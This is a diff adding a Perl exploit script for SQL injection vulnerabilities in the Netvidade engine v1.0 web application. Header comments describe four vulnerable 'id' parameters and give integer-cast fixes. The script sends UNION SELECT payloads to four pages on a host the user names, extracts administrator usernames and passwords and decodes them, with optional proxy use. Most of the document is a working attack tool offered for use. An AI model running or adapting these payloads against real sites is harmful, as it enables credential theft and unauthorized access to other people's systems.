@@ -1,0 +1,209 @@
+#!/usr/bin/perl -w
+use strict;
+use LWP::UserAgent;
+use Getopt::Long;
+use MIME::Base64;
+
+#                               \#'#/
+#                               (-.-)
+#    ----------------------oOO---(_)---OOo----------------------
+#    |               __             __                         |
+#    |         _____/ /_____ ______/ /_  __  ______ ______     |
+#    |        / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/     |
+#    |       (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )      |
+#    |      /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/       |
+#    |      Security Research Division      /____/ 2o1o        |
+#    -----------------------------------------------------------
+#    |     Netvidade engine v1.0 Multiple Vulnerabilities      |
+#    -----------------------------------------------------------
+# [!] Discovered by.: pwndomina
+# [!] Vendor........: http://www.netvidade.com
+# [!] Detected......: 15.04.2010
+# [!] Reported......: 06.05.2010
+# [!] Response......: xx.xx.2010
+#
+# [!] Bug...........: $_GET['id'] in webtemplate-categoria.php near line 6
+#
+#                     3: if ($_GET['id']==0)
+#                     4:         $lista_webtemp=$netvidade->lista_webtemp();
+#                     5: else
+#                     6:         $lista_webtemp=$netvidade->lista_webtemp_categoria($_GET['id']);
+#
+#                     The function lista_webtemp_categoria() is in class/var/netvidade.class.php near line 212
+#
+#                     212: function lista_webtemp_categoria($id)
+#                     213: {
+#                     214: $query="select a.*,b.id as categoria_id, b.titulo as categoria_nome from webtemplate a, webtemplate_categorias b  where a.categoria=b.id AND a.categoria=$id";
+#                     215: $a=$this->CORE->db();
+#                     216: $res=$a->abrecursor($query);
+#                     217: return $res;
+#                     218: }
+#
+# [!] Bug...........: $_GET['id'] in concorrer.php near line 2
+#
+#                     2: $lista_proposta=$recrutamento->lista_proposta($_GET['id']);
+#
+#                     The function lista_proposta() is in class/var/recrutamento.class.php near line 42
+#
+#                     42: function lista_proposta($id)
+#                     43: {
+#                     44: $query="select * from recrutamento_propostas where id=$id";
+#                     45: $a=$this->CORE->db();
+#                     46: $res=$a->abrecursor($query);
+#                     47: return $res;
+#                     48: }
+#
+# [!] Bug...........: $_GET[id] in detalhe.php near line 6
+#
+#                     6: $noticias=$a->lista_noticia_detalhe($_GET[id]);
+#
+#                     The function lista_noticia_detalhe() is in class/var/noticias.class.php near line 208
+#
+#                     208: function lista_noticia_detalhe($id)
+#                     209: {
+#                     210: $query="
+#                     211: select a.*,b.id as categoria_id, b.titulo as categoria_nome, c.nome as autor_nome
+#                     212: from noticias a, noticias_categorias b, administradores c
+#                     213: where a.categoria=b.id and a.id=$id and a.autor=c.id and a.data_online <= NOW() and if(a.data_offline != '0000-00-00',a.data_offline > NOW(),1)
+#                     214: ";
+#                     215: 
+#                     216: $a=$this->CORE->db();
+#                     217: $res=$a->abrecursor($query);
+#                     218: return $res;
+#                     219: }
+#
+# [!] Bug...........: $_GET[id] in newsletter_preview.php near line 6
+#
+#                     6: $dados=$a->lista_newsletter($_GET[id]);
+#
+#                     The function lista_newsletter() is in class/var/newsletter.class.php near line 113
+#
+#                     113: function lista_newsletter($id)
+#                     114: {
+#                     115: $query="select a.*,b.nome,c.corpo from newsletter a LEFT JOIN newsletter_corpo c ON  a.id=c.id, newsletter_templates b where a.template=b.id  and a.id=$id";
+#                     116: $a=$this->CORE->db();
+#                     117: $res=$a->abrecursor($query);
+#                     118: return $res;
+#                     119: }
+#
+# [!] Quick fix.....: in class/var/netvidade.class.php line 214
+#
+#                     - replace:
+#                         $query="select a.*,b.id as categoria_id, b.titulo as categoria_nome from webtemplate a, webtemplate_categorias b  where a.categoria=b.id AND a.categoria=$id";
+#
+#                     - with:
+#                         $query="select a.*,b.id as categoria_id, b.titulo as categoria_nome from webtemplate a, webtemplate_categorias b  where a.categoria=b.id AND a.categoria=".(int)$id;
+#
+# [!] Quick fix.....: in class/var/recrutamento.class.php line 44
+#
+#                     - replace:
+#                         $query="select * from recrutamento_propostas where id=$id";
+#
+#                     - with:
+#                         $query="select * from recrutamento_propostas where id=".(int)$id;
+#
+# [!] Quick fix.....: in class/var/noticias.class.php line 213
+#
+#                     - replace:
+#                         where a.categoria=b.id and a.id=$id and a.autor=c.id and a.data_online <= NOW() and if(a.data_offline != '0000-00-00',a.data_offline > NOW(),1)
+#
+#                     - with:
+#                         where a.categoria=b.id and a.id=".(int)$id." and a.autor=c.id and a.data_online <= NOW() and if(a.data_offline != '0000-00-00',a.data_offline > NOW(),1)
+#
+# [!] Quick fix.....: in class/var/newsletter.class.php line 115
+#
+#                     - replace:
+#                         $query="select a.*,b.nome,c.corpo from newsletter a LEFT JOIN newsletter_corpo c ON  a.id=c.id, newsletter_templates b where a.template=b.id  and a.id=$id";
+#
+#                     - with:
+#                         $query="select a.*,b.nome,c.corpo from newsletter a LEFT JOIN newsletter_corpo c ON  a.id=c.id, newsletter_templates b where a.template=b.id  and a.id=".(int)$id;
+#
+# [!] Greetings.....: cih.ms and phact.in
+#
+
+if(!$ARGV[3])
+{
+  print "\n                             \\#'#/                          ";
+  print "\n                             (-.-)                           ";
+  print "\n   ---------------------oOO---(_)---OOo----------------------";
+  print "\n   | Netvidade engine v1.0 Multiple Vulnerabilities Exploit |";
+  print "\n   |                discovered by pwndomina                 |";
+  print "\n   |                     coded by DNX                       |";
+  print "\n   ----------------------------------------------------------";
+  print "\n[!] Usage: perl netvidade.pl [Host] [Path] [Target] <Options>";
+  print "\n[!] Example: perl netvidade.pl www.host.com /path/ -t 3 -u 1";
+  print "\n[!] Targets:";
+  print "\n       -t 1            webtemplate-categoria.php";
+  print "\n       -t 2            concorrer.php";
+  print "\n       -t 3            detalhe.php";
+  print "\n       -t 4            newsletter_preview.php";
+  print "\n[!] Options:";
+  print "\n       -u [no]         User-Id";
+  print "\n       -p [ip:port]    Proxy support";
+  print "\n[!] Notes:";
+  print "\n                       For the targets 2, 3 & 4 you can use -u option.";
+  print "\n";
+  exit;
+}
+
+my %options = ();
+GetOptions(\%options, "t=i", "u=i", "p=s");
+my $ua      = LWP::UserAgent->new();
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $target  = "http://".$host.$path;
+my $userid  = "";
+
+if($options{"p"}) { $ua->proxy('http', "http://".$options{"p"}); }
+if($options{"u"}) { $userid = "+where+id=".$options{"u"}; }
+
+print "[!] Exploiting...\n\n";
+
+if($options{"t"} == 1) { exploit1(); }
+elsif($options{"t"} == 2) { exploit2(); }
+elsif($options{"t"} == 3) { exploit3(); }
+elsif($options{"t"} == 4) { exploit4(); }
+
+print "\n[!] Exploit done\n";
+
+sub exploit1
+{
+  my $url = "http://".$host.$path."webtemplate-categoria.php?id=-1337+union+select+1,2,concat(0x23,0x23,username,0x23,password,0x23,0x23),4,5,6,7,8,9,10,11,12,13,14,15,16,17+from+administradores";
+  my $res = $ua->get($url);
+  check($res);
+}
+
+sub exploit2
+{
+  my $url = "http://".$host.$path."concorrer.php?id=-1337+union+select+1,concat(0x23,0x23,username,0x23,password,0x23,0x23),3,4,5,6,7,8,9,10+from+administradores".$userid;
+  my $res = $ua->get($url);
+  check($res);
+}
+
+sub exploit3
+{
+  my $url = "http://".$host.$path."detalhe.php?id=-1337+union+select+1,2,3,concat(0x23,0x23,username,0x23,password,0x23,0x23),5,6,7,8,9,10,11,12,13,14+from+administradores".$userid."/*";
+  my $res = $ua->get($url);
+  check($res);
+}
+
+sub exploit4
+{
+  my $url = "http://".$host.$path."newsletter_preview.php?id=-1337+union+select+1,concat(0x23,0x23,username,0x23,password,0x23,0x23),3,4,5,6+from+administradores".$userid;
+  my $res = $ua->get($url);
+  check($res);
+}
+
+sub check
+{
+  my $res = shift;
+  my $content = $res->content;
+  my @c = split(/\n/, $content);
+  foreach (@c)
+  {
+    if($_ =~ /##(.*?)#(.*?)##/)
+    {
+      print $1.":".decode_base64($2)."\n";
+    }
+  }
+}
